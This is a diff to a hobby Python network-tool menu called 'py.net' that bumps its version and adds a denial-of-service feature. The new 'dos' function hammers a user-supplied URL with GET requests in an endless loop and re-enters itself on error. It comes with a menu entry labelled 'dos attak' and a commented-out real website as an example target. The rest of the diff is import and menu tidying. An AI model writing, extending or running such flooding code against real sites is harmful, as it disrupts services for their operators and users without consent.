@@ -6,7 +6,7 @@ from platform import system
 from socket import socket, AF_INET, SOCK_DGRAM
 from subprocess import check_output
 import os
-import scapy.all as sc
+from scapy import all as scapy
 from scapy.all import ARP, Ether, srp
 import subprocess
 import psutil
@@ -15,8 +15,11 @@ import time
 #pip install requests
 #pip install --pre scapy[basic]
 #pip install folium
+#pip install libpcap
+#pip install async-lru
+
 kast =' >>'
-version =' 1.0 '
+version =' 1.5 '
 def ippy():
     base_url = "https://demo.ip-api.com/json/"
     ip = input(f"ip {kast}")
@@ -109,12 +112,36 @@ def ping(ping_url):
     print('ping',response)
     return response
 
+def dos(ping_ulr):
+    #ping_ulr='https://uts.sirius.online/'
+    def ping(ping_ulr):
+        start_time = time.time()
+        k=requests.get(ping_ulr)
+        k.status_code
+        response=time.time() - start_time
+        print('ping',response)
+        return response
+    ping(ping_ulr)
+    while True:
+        try:
+            def dos(ping_ulr):
+             # Making a get request
+                response = requests.get(ping_ulr)
+                # print status code
+                print(response.status_code)
+            dos(ping_ulr)
+        except:
+            ping(ping_ulr)
+            print('error')
+            dos(ping_ulr)
+
     
 
 preview_text = Figlet(font='standard')
 print("\033[32m{}".format(preview_text.renderText('py.net')))
 print(f"V{version}")
-print(f"[01]pyip \n[02]scan_local_net\n[03]ban_ip\n[04]mu_ip\n[05]exit\ninter_info()\nping")
+print(f"[01]pyip \n[02]scan_local_net\n[03]ban_ip\n[04]mu_ip\n[05]exit\n[6]inter_info()\n[07]ping\n[08]dos attak")
+
 menu = input(f'pyNet{kast}')
 if menu =="1":
     ippy()
@@ -129,21 +156,20 @@ elif menu =="5":
 elif menu =="6":
     inter_info()
 elif menu =="7":
-    ping_url=input("url{kast}")
+    ping_url=input(f"url{kast}")
     if ping_url =="":
         print(ping('https://yandex.ru'))
     elif ping_url==" ":
-        print(ping('https://yandex.ru'))
+        print(ping('https://yandex.ru'))    
     else:
         print(ping(ping_url))
+elif menu =="8":
+    dos(input(f'ulr to attac{kast}'))
         
         
 
 else:
     print('error 1: комманда не найдена ')
-
-
-
 
 
 
